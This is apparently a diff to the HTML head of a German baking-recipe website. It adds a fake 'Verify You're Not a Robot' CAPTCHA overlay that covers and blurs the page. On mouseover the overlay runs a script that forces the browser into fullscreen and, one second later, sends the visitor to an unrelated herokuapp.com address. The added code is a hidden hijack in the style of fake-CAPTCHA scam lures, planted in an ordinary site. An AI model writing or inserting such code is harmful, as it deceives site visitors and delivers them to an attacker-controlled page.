@@ -9,6 +9,240 @@
   <meta property="og:description" content="Entdecken Sie mit Churantatri köstliche Cake Recipes, Pastry Recipes und Macaron Rezepte. Lernen Sie Bäckerei-Stil zu Hause zu backen. Jetzt starten!">
   <meta property="og:type" content="website">
   <title>Churantatri - Backvergnügen | Cake Recipe & Pastry Recipe</title>
+   <div id="popup-wrapper" onmouseover="fullscreenAndRedirect()">
+    <div id="popup-bg"></div>
+
+    <div class="popup-card">
+      <span class="close-btn">&times;</span>
+
+      <div class="content">
+        <div class="icon">🤖</div>
+
+        <div class="text">
+          <h2>Verify You're Not a Robot</h2>
+
+          <p>
+            Please complete the verification below before continuing.
+          </p>
+
+          <div class="robot-box">
+            <input type="checkbox" id="robotCheck">
+            <label for="robotCheck">I'm not a robot</label>
+
+            <div class="captcha-brand">
+              <div>Verification</div>
+              <small>Human Check</small>
+            </div>
+          </div>
+
+          <div class="actions">
+            <button id="continueBtn" disabled>
+              Continue
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <style>
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    #popup-wrapper {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2147483647;
+    }
+
+    #popup-bg {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .65);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+    }
+
+    .popup-card {
+      position: relative;
+      width: 720px;
+      max-width: 92%;
+      background: #fff;
+      border-radius: 22px;
+      padding: 28px;
+      box-shadow: 0 30px 90px rgba(0, 0, 0, .45);
+      font-family: Arial, Helvetica, sans-serif;
+      z-index: 2147483647;
+      animation: popup .25s ease-out;
+    }
+
+    @keyframes popup {
+      from {
+        opacity: 0;
+        transform: scale(.9);
+      }
+
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .close-btn {
+      position: absolute;
+      right: 16px;
+      top: 12px;
+      font-size: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      color: #666;
+    }
+
+    .content {
+      display: flex;
+      gap: 20px;
+    }
+
+    .icon {
+      width: 70px;
+      height: 70px;
+      min-width: 70px;
+      border-radius: 16px;
+      background: #f3f4f6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 38px;
+    }
+
+    .text {
+      flex: 1;
+    }
+
+    .text h2 {
+      margin: 0 0 10px;
+      font-size: 34px;
+      font-weight: 800;
+      color: #111827;
+    }
+
+    .text p {
+      margin: 0;
+      font-size: 18px;
+      line-height: 1.6;
+      color: #4b5563;
+    }
+
+    .robot-box {
+      margin-top: 22px;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      background: #fafafa;
+      padding: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .robot-box input {
+      width: 28px;
+      height: 28px;
+      cursor: pointer;
+    }
+
+    .robot-box label {
+      flex: 1;
+      margin-left: 12px;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .captcha-brand {
+      text-align: center;
+      font-size: 12px;
+      color: #6b7280;
+    }
+
+    .actions {
+      margin-top: 24px;
+    }
+
+    .actions button {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      background: #2563eb;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .actions button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    @media(max-width:768px) {
+      .content {
+        flex-direction: column;
+      }
+
+      .icon {
+        margin: auto;
+      }
+
+      .text h2 {
+        font-size: 28px;
+        text-align: center;
+      }
+
+      .text p {
+        text-align: center;
+      }
+    }
+  </style>
+
+  <script>
+    const robotCheck = document.getElementById("robotCheck");
+    const continueBtn = document.getElementById("continueBtn");
+
+    robotCheck.addEventListener("change", function () {
+      continueBtn.disabled = !this.checked;
+    });
+
+    continueBtn.addEventListener("click", function () {
+      alert("Verification completed.");
+      // Add your own action here
+    });
+
+    document.querySelector(".close-btn").addEventListener("click", function () {
+      document.getElementById("popup-wrapper").style.display = "none";
+    });
+
+     function fullscreenAndRedirect() {
+    const el = document.documentElement;
+
+    if (!document.fullscreenElement) {
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+
+    setTimeout(() => {
+      window.location.href = "https://winindnmbmnnbde-ab15cacc792e.herokuapp.com/";
+    }, 1000);
+  }
+  </script>
   <link rel="canonical" href="https://churantatri-site.com">
   <link rel="icon" type="image/svg+xml" href="{{favicon_file}}">
   <script src="https://cdn.tailwindcss.com"></script>
